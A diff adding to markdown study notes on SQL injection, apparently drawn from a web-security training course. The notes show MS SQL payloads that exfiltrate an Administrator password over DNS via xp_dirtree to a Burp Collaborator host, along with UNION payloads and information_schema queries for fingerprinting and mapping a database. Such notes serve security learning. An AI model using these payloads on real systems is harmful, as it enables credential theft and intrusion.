@@ -116,6 +116,27 @@ ERROR: invalid input syntax for type integer: "Example data"
 - The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain: ``'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`` 
 - Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example: ``'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--``
 - This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup. Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
+--- 
+###  Examining the database in SQL injection attacks
+
+- Different databases provide different ways of querying their version.
+- The queries to determine the database version for some popular database types are as follows:
+
+|   |   |
+|---|---|
+|Database type|Query|
+|Microsoft, MySQL|`SELECT @@version`|
+|Oracle|`SELECT * FROM v$version`|
+|PostgreSQL|`SELECT version()`|
+
+- For example, you could use a `UNION` attack with the following input:
+	- `' UNION SELECT @@version--`
+
+##### Listing the contents of the database
+- Most database types (with the notable exception of Oracle) have a set of views called the **information schema** which provide **information about the database**.
+- You can query `information_schema.tables` to list the tables in the database: ``SELECT * FROM information_schema.tables``
+- You can then query `information_schema.columns` to list the columns in individual tables, example: ``SELECT * FROM information_schema.columns WHERE table_name = 'Users'``
+> Oracle databases, You can list tables by querying `all_tables`. `SELECT * FROM all_tables` and to retrieve the list of columns you can use `all_tab_columns` , example: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
 
 ---
 
